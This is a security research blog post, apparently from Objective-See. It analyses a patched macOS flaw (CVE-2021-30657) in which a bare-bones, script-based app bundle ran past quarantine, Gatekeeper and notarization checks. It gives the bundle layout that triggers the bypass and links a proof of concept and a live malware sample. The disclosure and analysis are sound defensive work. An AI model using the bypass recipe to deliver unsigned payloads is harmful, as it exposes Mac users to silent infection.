<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x64/overview.png />
<meta name="twitter:title" content=All&#32;Your&#32;Macs&#32;Are&#32;Belong&#32;To&#32;Us />
<meta name="twitter:description" content=bypassing&#32;macOS&#39;s&#32;file&#32;quarantine,&#32;gatekeeper,&#32;and&#32;notarization&#32;requirements />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=All&#32;Your&#32;Macs&#32;Are&#32;Belong&#32;To&#32;Us />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x64/overview.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">All Your Macs Are Belong To Us</div>
  <div class="blogSubTitle">bypassing macOS&#39;s file quarantine, gatekeeper, and notarization requirements</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / April 26, 2021</div>
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; border-radius: 10px;">
    <div style="text-align: left; padding-bottom: 10px;">Our research, tools, and writing, are supported by the "Friends of Objective-See" such as:</div>
    <center>
    <div class="download-link" style="padding: 10px; margin-right:30px;">
          <a href="https://1password.com/?utm_medium=parnter&utm_source=Objective-See&utm_campaign=gp&utm_content=sponsorship" style="border: 0px;">
              <img src="../images/friends/1Password.png" height="50px" border="0" style="margin-top: 10px; border-radius: 10%;">
          <div class="logo-title" style="text-align: center; font-size: 11px;">The world‚Äôs most-loved password manager.</div>
          </a>
      </div>
      <div class="download-link" style="padding: 10px;">
          <a href="https://www.jamf.com?utm_source=objective-see&utm_medium=sponsored-link&utm_campaign=next-gen-security&utm_content=2021-02-05_protect" style="border: 0px;">
              <img src="../images/friends/jamf.png" height="50px" border="0" style="margin-top: 10px; border-radius: 10%;">
          <div class="logo-title" style="text-align: center; font-size: 11px;">The standard in Apple enterprise management.</div>
          </a>
      </div>
      <div class="download-link" style="padding: 10px;">
          <a href="https://mosyle.com/" style="border: 0px;">
              <img src="../images/friends/mosyle.png" height="50px" border="0" style="margin-top: 10px; border-radius: 10%;">
          <div class="logo-title" style="text-align: center; font-size: 11px;">Modern Apple MDM and security for enterprise & education.
        </div>
          </a>
      </div>
      </center>
      <br>
      <div align="right" style="padding-right:10px; padding-bottom:10px;">
        <a href="https://objective-see.com/friends.html" class="inlineLink">Become a Friend!</a>
    </div>
</div>
<br>
<div class="note">
üëæ Want to play along?
<p>I&rsquo;ve uploaded a sample <a href="https://objective-see.com/downloads/blog/blog_0x64/PoC.zip">Proof of Concept</a>
&hellip;when run, it simply pops Calculator.app.
<br>
<br>
<br>
‚ö†Ô∏è Malware</p>
<p>I&rsquo;ve also uploaded a malware sample (<a href="https://objective-see.com/downloads/blog/blog_0x64/Shlayer.zip">Shlayer.zip</a>) that exploited this vulnerability in the wild as a 0day! (password: infect3d)</p>
</div>
<h3 id="-printable">üñ®Ô∏è Printable</h3>
<p>A printable (PDF) version of this blog post, can be downloaded here:</p>
<center>
   <a href="https://objective-see.com/downloads/blog/blog_0x64/All_Your_Macs_Are_Belong_To_Us.pdf" class="inlineLink">"All_Your_Macs_Are_Belong_To_Us.pdf"</a>.
</center> 
<h3 id="outline">Outline</h3>
<p>This is our 100th blog post &hellip;and it&rsquo;s a doozy!</p>
<p>But first, go update your macOS systems to 11.3, as it contains a patch for a massive bug that affects all recent versions of macOS&hellip;a bug that is the topic of this blog post.</p>
<p>This bug trivially bypasses many core Apple security mechanisms, leaving Mac users at grave risk:</p>
<img src="../images/blog/blog_0x64/PoC.gif"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">opened ‚Üí owned</center>

<p>&hellip;and especially worrisome, turns out malware authors are <em>already</em> exploiting it in the wild as an 0day. Yikes!</p>
<div class="note">
Apple patched the bug as CVE-2021-30657, noting "a malicious application may bypass Gatekeeper checks"
<p>The security researcher <a href="https://twitter.com/cedowens" class="inlineLink">Cedric Owens</a> uncovered the flaw and initially reported the bug to Cupertino. Epic find Cedric! ü§©</p>
<p>Cedric notes the bug manifested while building red team payloads via the <a href="https://gist.github.com/mathiasbynens/674099" class="inlineLink">appify</a> developer tool. He&rsquo;s posted a must read, that provides step by step details on how this bug may be practically leveraged to surreptitiously deliver payloads in red team exercises:</p>
<center>
  <a href="https://cedowens.medium.com/macos-gatekeeper-bypass-2021-edition-5256a2955508" class="inlineLink">"macOS Gatekeeper Bypass (2021) Addition"</a>.
</center>
<p>However, as the underlying cause of the bug remained unknown, our blog post focuses on uncovering the reason &hellip;ultimately discovering a flaw that lay deep within macOS&rsquo;s policy subsystem(s).</p>
</div>
<p>There&rsquo;s a rather massive amount of information presented in this blog post, so let&rsquo;s break down what we&rsquo;re going to cover:</p>
<ul style="list-style-type:square;">
  <li> <a href="#background" class="inlineLink">Background</a>:
  <br>
  We begin the post with a discussion of common (user-assisted) infection vectors and highlight security mechanisms that Apple has introduced to keep users safe. It is important to understand these core macOS security mechanisms, as they are the very mechanisms the bug trivially and wholly bypasses.
  </li>
  <br>
  <li><a href="#root-cause-analysis" class="inlineLink">Root Cause Analysis</a>:
  <br>
  The core of the blog post digs deep into the bowels of macOS to uncover the root cause of the bug. In this section, we'll detail the flaw which ultimately results in the misclassification of quarantined items, such as malicious applications. Such misclassified apps, even if unsigned (and unnotarized), will be allowed to run uninhibited. No alerts, no prompts, and not blocked. Oops! 
  </li>
  <br>
  <li><a href="#in-the-wild" class="inlineLink">In the Wild (0day)</a>:
  <br>
  Unfortunately a subversive malware installer is already exploiting this flaw in the wild, as a 0day. In this section of the post, we briefly discuss this worrisome finding.
  </li>
  <br>
  <li><a href="#the-patch" class="inlineLink">The Patch</a>:
  <br>
  Next, after reverse-engineering Apple's 11.3 update, we describe how Cupertino addressed this flaw. And good news, once patched macOS users should regain full protection. 
  </li>
  <br>
  <li> <a href="#protections" class="inlineLink">Protections</a> &amp; <a href="#detections" class="inlineLink">Detections</a>: 
  <br>
  Finally, we'll wrap things up with a brief discussion on protections, most notably highlighting the fact that <a href="https://www.objective-see.com/products/blockblock.html" class="inlineLink">BlockBlock</a> already provided sufficient protection against this 0day. Here, we'll also discuss a novel idea aimed at detecting previous attacks that exploited this flaw, and provide a simple Python script, <a href="https://objective-see.com/downloads/blog/blog_0x64/scan.py" class="inlineLink">scan.py</a>, to automate such detection! 
  </li>
</ul>
<h3 id="background">Background</h3>
<p>The majority of Mac malware infections are a result of users (naively, or mistakenly) running something they should not. And while such infections, yes, do require user interaction, they are still massively successful. In fact, the recently discovered <code>Silver Sparrow</code> malware, successfully infected over 30,000 Macs in a matter of weeks, even though such infections did require such user interactions. (See: &ldquo;<a href="https://threatpost.com/silver-sparrow-malware-30k-macs/164121/">Mysterious Silver Sparrow Malware Found Nesting on 30K Macs</a>&rdquo;).</p>
<p>And how do malware authors convince such users to infect themselves? Ah, in a myriad of creative, wily, and surreptitious ways such as:</p>
<ul>
<li>
<p>Packaged with shareware:
<br>
Example(s): <code>OSX.InstallCore</code>, and countless other adware.</p>
</li>
<li>
<p>Malicious search results:
<br>
Example(s): <code>OSX.Shlayer</code>, <code>OSX.SilverSparrow</code>, etc.</p>
</li>
<li>
<p>Pirated/cracked applications
<br>
Example(s): <code>OSX.iWorm</code>, <code>OSX.BirdMiner</code>, etc.</p>
</li>
<li>
<p>Fake (Flash) Updaters / Applications
<br>
Example(s): <code>OSX.Shlayer</code>, <code>OSX.Siggen</code>, etc.</p>
</li>
<li>
<p>Malicious email attachments
<br>
Example(s): <code>OSX.LaoShu</code>, <code>OSX.Janicab</code>, etc.</p>
</li>
<li>
<p>Supply chain payloads
<br>
Example(s): <code>OSX.Proton</code>, <code>OSX.KeRanger</code>, etc.</p>
</li>
<li>
<p>And many many more!</p>
</li>
</ul>
<p>Yes, when the user falls for some of these infection vectors (e.g. pirated applications) we collectively shake our heads and wonder &ldquo;<em>well, what did you expect!?</em>&rdquo;, however other infection vectors are far more surreptitious and arguably the user is not at fault in any way. For example, in a supply chain attack, where a legitimate software distribution website is hacked and legitimate products are trojanized, it&rsquo;s unreasonable to blame any user who inadvertently downloads and runs such software.</p>
<p>Regardless of who&rsquo;s at fault (or not), Apple seems to feel personally attacked. Besides of course wanting what&rsquo;s best for their <del>shareholders</del> users, they have an image to uphold! Remember, &ldquo;<em>Macs Don&rsquo;t Get Malware!</em>&rdquo; (tm).</p>
<p>All kidding (and criticisms) aside, over the years Apple has taken several important steps aimed at preventing any and all &ldquo;user-assisted&rdquo; infections. Here, we briefly recap such major steps that include the addition of OS-level security mechanisms such as File Quarantine, Gatekeeper, and Application Notarization. An understanding of these foundation macOS protection mechanism is important as many users, and even some enterprises have come to (solely) depend on them. Which is fine(ish), unless Apple ships buggy code that undermines all such protections!</p>
<h4 id="file-quarantine">File Quarantine</h4>
<p>File Quarantine, was introduced in OSX Leopard (10.5), all the way back in 2007! When a user first opens a downloaded file such as an application, File Quarantine provides a warning to the user that requires explicit confirmation before allowing the file to execute. The idea is simply to ensure that the user understands that they are indeed opening an application (even if the file looks like, say, a PDF document).</p>
<p>For an example of File Quarantine in action let&rsquo;s look at the <code>OSX.LaoShu</code> malware. In order to surreptitiously trick users into infecting themselves, attackers sent targeted victims customized emails with a link to a malicious URL. If the user clicked on the link, a malicious application (masquerading as a PDF document) would be automatically downloaded:</p>
<img src="../images/blog/blog_0x64/download.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">A malicious app (OSX.LaoShu), masquerading as a PDF (image credit: Sophos).</center>

<p>If the user would attempt to open what they (understandably) believed was a PDF document, File Quarantine would spring into action, alerting the user that this was in fact an application, <em>not</em> a harmless PDF document:</p>
<img src="../images/blog/blog_0x64/fq.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">File Quarantine in action (image credit: Sophos).</center>

<p>Ideally the user would recognize their (near) faux pas and the infection would be thwarted thanks to File Quarantine! It should be noted that even today, a File Quarantine prompt is shown for approved (i.e. notarized) applications.</p>
<h4 id="gatekeeper">Gatekeeper</h4>
<p>Unfortunately users kept infecting themselves, often by ignoring or simply clicking through File Quarantine alerts. To combat this, as well as evolving malware infection vectors, Apple introduced Gatekeeper in OSX Lion (10.7). Built atop File Quarantine, Gatekeeper checks the code signing information of downloaded items and blocks those that do not adhere to system policies. (For example, it checks that items are signed with a valid developer ID):</p>
<img src="../images/blog/blog_0x64/gk.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">A Gatekeeper overview</center>

<p>Apple&rsquo;s logic was rooted in the (mis)belief that malware authors would not be able to obtain such Apple Developer IDs, and thus their malware would remain unsigned and thus generically blocked by Gatekeeper. In the image above, note that when unsigned malware is executed, Gatekeeper will block it and alert the user. Moreover, there is no option in the Gatekeeper prompt to allow the (unsigned) code to run. Thus the user is protected. Hooray?</p>
<p>Of course it turned to be fairly trivial for attackers to obtain Apple Developer IDs and thus sign their malicious creations. For example in a supply chain attack against the popular <code>MacUpdate.com</code> website, attackers trojanized and (re)signed popular software such as Firefox:</p>
<img src="../images/blog/blog_0x64/signed.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Trojanized Firefox (note: &#34;Developer ID Application: Ramos Jaxson&#34;)</center>

<p>If users downloaded and ran the trojanized Firefox, Gatekeeper would allow it &hellip;as it was &ldquo;validly&rdquo; (re)signed. Thus the system would be infected.</p>
<p>Unfortunately even today, it&rsquo;s still trivial for attackers to obtain such Apple Developer IDs and thus sign their malicious creations:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">I noticed dozen websites flourishing (even through google ads) for buying/selling/renting Apple developer entreprise accounts and Apple developer certificates.<br>I guess the macOS malware season has started üòÇüåªüåº <a href="https://t.co/PQnrUKQhUF">pic.twitter.com/PQnrUKQhUF</a></p>&mdash; taha (@lordx64) <a href="https://twitter.com/lordx64/status/1378254774173372417?ref_src=twsrc%5Etfw">April 3, 2021</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>It should be noted that even if Gatekeeper is bypassed a File Quarantine prompt would still be shown to the user. Recall that such a prompt requires explicit user-approval. Still, as Gatekeeper failed to be a panacea, Apple had to respond &hellip;yet again.</p>
<h4 id="notarization-requirements">Notarization Requirements</h4>
<p>Most recently, macOS Catalina (10.15) took yet another step at combating user-assisted infections with the introduction of Application Notarization requirements. These requirements ensure that Apple has scanned and approved all software before it is allowed to run, giving users, (as noted by Apple), &ldquo;confidence&rdquo; that the software, &ldquo;has been checked for malicious components&rdquo;:</p>
<img src="../images/blog/blog_0x64/notarization.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">A notarization overview</center>

<p>Note that similar to a Gatekeeper alert, in a Notarization alert there is no option for the user to allow the unnotarized code to run. Thus code that has not been scanned and notarized by Apple will be blocked.</p>
<p>Notarization is clearly the most draconian, yet arguably &ldquo;best&rdquo; approach yet to protect macOS users from inadvertently infecting themselves.
&hellip;and rather humorously has resulted in hackers sliding into my DMs, as notarization apparently ruined their whole operation. Ha!</p>
<img src="../images/blog/blog_0x64/hackers.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Notarization vs. Hackers</center>

<h4 id="quarantine-attribute">Quarantine Attribute</h4>
<p>Before we detail a logic flaw in macOS that allows an attacker to trivially and reliably bypass <em>all</em> of these foundational mitigations, let&rsquo;s briefly talk about the quarantine attribute. You may have been wondering, how does macOS know to analyze a file in order to possibly display a File Quarantine, Gatekeeper, or Notarization prompt? The answer is the quarantine attribute!</p>
<p>Simply put, whenever an item is downloaded from the Internet (via an application such as a browser), macOS or the application that downloaded the item, will tag it with an extended attribute, named <code>com.apple.quarantine</code>. You can confirm this for yourself. First download any file via your browser and then run macOS&rsquo;s &ldquo;extended attribute&rdquo; utility, <code>xattr</code> along with the path to file:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% xattr ~/Downloads/BlockBlock\ Installer.app
com.apple.quarantine

% xattr -p com.apple.quarantine ~/Downloads/BlockBlock\ Installer.app
0081;606ec805;Chrome;BCCEDD88-5E0C-4F6A-95B7-DBC0D2D645EC
</pre>
</div>
<p>Note that the <code>-p</code> option will print out the contents of the specified extended attribute. For the <code>com.apple.quarantine</code> this includes various flags, a time stamp, the responsible application that downloaded the file, and a UUID that maps to a key in the <code>com.apple.LaunchServices.QuarantineEventsV*</code> database.</p>
<p>Whenever the user first attempts to open a file that contains a quarantine attribute (i.e. anything downloaded from the Internet), macOS will launch the process in a suspended state. Then, the system will perform a myriad of complex checks on the file, designed to trigger the appropriate alert or prompt. On modern versions of macOS the user will either be shown:</p>
<ol>
<li>
<p>A (File Quarantine) prompt requiring explicit user consent (if the item is validly signed and notarized).<br>
<br>
&hellip;or</p>
</li>
<li>
<p>A (Notarization) alert informing the user that the file cannot be run (if the item is not validly signed and notarized).</p>
</li>
</ol>
<p>If the process is allowed (signed &amp; notarized) and the user approves it, the system will then unsuspend (resume) it &hellip;allowing it to now execute.</p>
<div class="note">
If a file does not contain the com.apple.quarantine attribute, macOS assumes it's a local file. As such, none of the checks will be performed and thus no prompts/alerts will be shown. This is by design, and is not a bug. 
<p>While this means malware that is <em>already</em> on the box can download unsigned/unnotarized (second-stage) payloads, strip the quarantine attribute, then launch said payloads without fear of alerts  &hellip;the fact remains the <em>initial</em> malware (or its delivery mechanism) will possess the quarantine attribute, and thus will be subjected to such checks and/or alerts when launched.</p>
</div>
<p>But what if I told you there was a trivial and reliable way to bypass any and all such prompts!? &hellip;meaning, if a user simply double-clicks on the file, game freaking over!? ü•≤</p>
<h3 id="problems-in-paradise">Problem(s) In Paradise</h3>
<p>Since 2007 (when File Quarantine was introduced) macOS has alerted users whenever they attempt to launch an application that has been downloaded from the Internet. And now, on recent versions of macOS, unless that application has been scanned and explicitly approved (notarized) by Apple, macOS will refuse to run the file &hellip;or will it!?</p>
<p>Unfortunately as we&rsquo;ll see, due to a subtle logic bug deep within Apple&rsquo;s policy engine, it was possible to craft a malicious application that though unsigned (and hence unnotarized), would be allowed to launch with no prompts nor alerts. No File Quarantine prompt, no Gatekeeper alert, no Notarization alert &hellip;nothing!</p>
<p>In the following demo, a proof of concept application named &ldquo;Patricks_Resume&rdquo; is downloaded. Though it appears to be a harmless PDF document, when opened, though unsigned, unnotarized, and quarantined, it&rsquo;s able to launch Calculator.app (or really do pretty much anything else):</p>
<img src="../images/blog/blog_0x64/PoC.gif"  width="" class="center" style="border-radius: 4px;">

<p>Note that the exploited system is a fully patched M1 Macbook, running the latest macOS Big Sur (11.2.3).</p>
<p>We can confirm the downloaded app has been tagged with the quarantine attribute:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% xattr ~/Downloads/Patricks_Resume.app
com.apple.FinderInfo
com.apple.metadata:kMDItemWhereFroms
com.apple.quarantine
</pre>
</div>
<p>&hellip;and is completely unsigned (and thus unnotarized):</p>
<img src="../images/blog/blog_0x64/resume.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Unsigned, unnotarized, and quarantined</center>

<p>I guess, party like it&rsquo;s pre-2007!? üò±</p>
<div class="note">
It appears that this bug was introduced in macOS 10.15 ...thus older versions of macOS do not seem be vulnerable.
<p>If I had to guess, it was likely introduced along with macOS 10.15&rsquo;s new notarization logic. Thus the goal of attempting to secure and lock down macOS wholly backfired:</p>
<img src="../images/blog/blog_0x64/apple.gif"  width="" class="center" style="border-radius: 4px;">
<center style="color:#787878; padding-top:5px;">...meanwhile, at Cupertino? (image credit: @urupzia)</center>
</div>
<h3 id="root-cause-analysis">Root Cause Analysis</h3>
<p>Obviously this vulnerability is massively bad, as it affords malware authors the ability to return to their proven methods of targeting and infecting macOS users. Though we&rsquo;ll talk about 3rd-party methods of protections (that existed before Apple&rsquo;s patch!) as well as methods of detections exploitation attempts of this bug, first let&rsquo;s walk through the process of uncovering the root cause, the underlying flaw.</p>
<div class="note">
Our analysis was performed on a fully patched macOS Big Sur (11.2.3) system. Due to "security" features on M1 systems (that hinder debugging), we'll stick to a Intel/x86_64 system.
<p>However as the flaw is a logic issue, the systems underlying architecture is irrelevant (as illustrated in the exploitation of a M1 system in the video above).</p>
</div>
<p>Though the underlying flaw is found deep in the bowels of macOS, don&rsquo;t worry we&rsquo;ll gently ease in.</p>
<p>First, take a look at the our proof of concept application (<code>PoC.app</code>) that triggers the vulnerability (as this will be launched with no alerts nor prompts, even though it&rsquo;s unsigned, unnotarized, and quarantined).</p>
<img src="../images/blog/blog_0x64/icon.png"  width="25%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Our proof of concept application</center>

<p>At first glance, it appears to be a standard macOS application.</p>
<p>However, if we dig deeper, we note two important observations:</p>
<ol>
<li>
<p>The application&rsquo;s bundle is &ldquo;missing&rdquo; several standard components, most notably there is no <code>Info.plist</code> file. (An <code>Info.plist</code> file contains meta information about an application, such as the path to its executable).
<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ find PoC.app
PoC.app/Contents
PoC.app/Contents/MacOS
PoC.app/Contents/MacOS/PoC
</pre>
</div>
<br>
Instead, the application is solely composed of a directory named <code>PoC.app</code>, a <code>Contents</code> subdirectory, a <code>MacOS</code> sub-subdirectory, and then within that, a file whose name matches that of the (top-level) application (<code>PoC</code>).</p>
</li>
<li>
<p>The application&rsquo;s executable component (<code>PoC</code>) is not a mach-O binary, but rather a (bash) script:
<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file PoC.app/Contents/MacOS/PoC 
PoC.app/Contents/MacOS/PoC: POSIX shell script text executable, ASCII text
</pre>
</div></p>
</li>
</ol>
<p>In terms of the first observation, it turns out that many of the standard components of an application&rsquo;s bundle (e.g. the <code>Info.plist</code> file) are indeed optional. In fact, it appears that the system treats anything that ends in <code>.app</code> as an application. To test this, simply create an empty folder name <code>foo.app</code> and double-click it. Though it errors out (as it&rsquo;s just a folder, with no executable content), the error prompt confirms that the system did indeed try to launch it as an application:</p>
<img src="../images/blog/blog_0x64/foo.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">...tried (and failed) to launch as an app</center>

<p>Turns out, if we add a <code>Contents</code> folder, then (within that) a <code>MacOS</code> folder, and finally (within that) an executable item &hellip;it will successfully run! Though rather bare-boned, that&rsquo;s apparently all that&rsquo;s needed. It&rsquo;s worth reiterating that without an <code>Info.plist</code> file, the executable item&rsquo;s name, <em>must</em> match the name of the application. This is how macOS is still able to ascertain what to execute when the user double clicks the &ldquo;app&rdquo;. Hence, for our bare-bones proof of concept application (<code>PoC.app</code>), the item&rsquo;s name must be <code>PoC</code>:</p>
<img src="../images/blog/blog_0x64/app.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Our bare-boned PoC app&#39;s bundle structure</center>

<br>
<div class="note">
The "<a href="https://gist.github.com/mathiasbynens/674099" class="inlineLink">appify</a>" developer script on github, will programmatically create such a bare-bones application for you (that unintentionally, will trigger this vulnerability).
</div>
<p>Before moving on, let&rsquo;s ratchet up macOS application policy to its highest and most restrictive level, so that only applications from the macOS app store are allowed. In theory this means that external applications, even if notarized will be blocked by the OS:</p>
<img src="../images/blog/blog_0x64/policy.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Application policy</center>

<p>It&rsquo;s important though to note that the vulnerability also presents itself at lower / the default policy settings. That is to say, it is unrelated and unaffected by the system policy settings.</p>
<p>Let&rsquo;s now upload this &ldquo;bare-bones&rdquo; application, and then download it to simulate an attack. Once downloaded, we can confirm that, as expected, the application has been automatically tagged with the <code>com.apple.quarantine</code> extended attribute:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ xattr ~/Downloads/PoC.app 
...
com.apple.quarantine

$ xattr -p com.apple.quarantine ~/Downloads/PoC.app 
0081;606fefb9;Chrome;688DEB5F-E0DF-4681-B747-1EC74C61E8B6
</pre>
</div>
<p>Thus we can assume (and later confirm) that the bug is not related to a missing (or say corrupted) <code>com.apple.quarantine</code> attribute. And due to the presence of this quarantine attribute, we&rsquo;ll see it will <em>still</em> be evaluated by macOS&rsquo;s &ldquo;should-this-application-be-allowed-to-run&rdquo; logic.</p>
<p>We can also confirm (via a tools such as <a href="https://objective-see.com/products/whatsyoursign.html">WhatsYourSign</a>), that the application is unsigned (and thus also unnotarized):</p>
<img src="../images/blog/blog_0x64/wys.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">PoC.app: unsigned/unnotarized</center>

<p>Due to the fact that the application has been tagged with a quarantine attribute, and that it is unsigned (and thus not notarized), one would certainly think it would be soundly blocked by macOS. But as we noted early this is not the case &hellip;it&rsquo;s allowed to run uninhibited.</p>
<p>As the quarantined application is allowed (with no alerts nor prompts), this implies a bug is somewhere in macOS&rsquo;s application &ldquo;evaluation&rdquo; logic. Unfortunately (for us), when a user launches an application no less than half a dozen user-mode applications, system daemons and the kernel are involved.</p>
<p>In a 2016 talk at ShmooCon titled, &ldquo;<a href="https://files.speakerdeck.com/presentations/9e724ea233434f9fb083bff26bc7fb4b/ShmooCon_2016.pdf">Gatekeeper Exposed; Come, See, Conquer</a>&rdquo;, I provided a detailed (although now somewhat dated) walk-through of these interactions:</p>
<img src="../images/blog/blog_0x64/overview.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Launching an application is a complicated ordeal</center>

<p>Since this talk, Apple has expanded (read: complicated) this process, adding XPC calls into its system policy daemon, <code>syspolicyd</code>, and its XProtect (anti-virus) agent, <code>XprotectService</code>.</p>
<p>Instead of painstakingly walking through every single one of these interprocess and kernel interactions, let&rsquo;s see if we can first zero in on the likely location of the bug via a more passive approach &hellip;log messages!</p>
<h3 id="root-cause-analysis-to-the-logs">Root Cause Analysis: To The Logs!</h3>
<p>Recall that our problematic proof of concept application is a rather abnormal &ldquo;bare-bones&rdquo; application whose executable component is a script (versus a normal mach-O binary).</p>
<p>Our idea to get a better sense of where the bug may lie is rather simple. While monitoring system logs let&rsquo;s run:</p>
<ul>
<li>
<p>A &ldquo;normal&rdquo; application
<br>
&hellip;containing the standard application bundle files (such as an <code>Info.plist</code> file), as well as standard mach-O executable.</p>
</li>
<li>
<p>A script-based application (<code>Script.app</code>)
<br>
&hellip;containing the standard application bundle files (such as an <code>Info.plist</code> file), but a (bash) script as its executable.</p>
</li>
<li>
<p>Our proof-of-concept application (<code>PoC.app</code>)
<br>
&hellip;missing the standard application bundle files (such as an <code>Info.plist</code> file), <em>and</em> having a (bash) script as its executable.</p>
</li>
</ul>
<p>All three are unsigned and downloaded from the Internet (i.e. tagged with the <code>com.apple.quarantine</code> extended attribute). As the &ldquo;normal&rdquo; and script-based application are both blocked (as expected) ideally we&rsquo;ll quickly uncover any divergent logic which can point us decisively in the direction of a bug which allows our PoC to run!</p>
<p>On recent versions of macOS, Apple has unified all logging and provided a new utility (aptly named) <code>log</code> to parse and view all log messages. If executed with the <code>stream</code> parameter, the <code>log</code> utility will stream messages to a terminal window as they&rsquo;re generated.</p>
<p>Unfortunately for security and privacy reasons much of the (likely relevant) output is redacted. (You&rsquo;ve likely seen the <code>&lt;private&gt;</code> keyword, indicating some/all of the message has been redacted). However by installing a customized profile we can disable such redactions and thus fully view any and all log messages.</p>
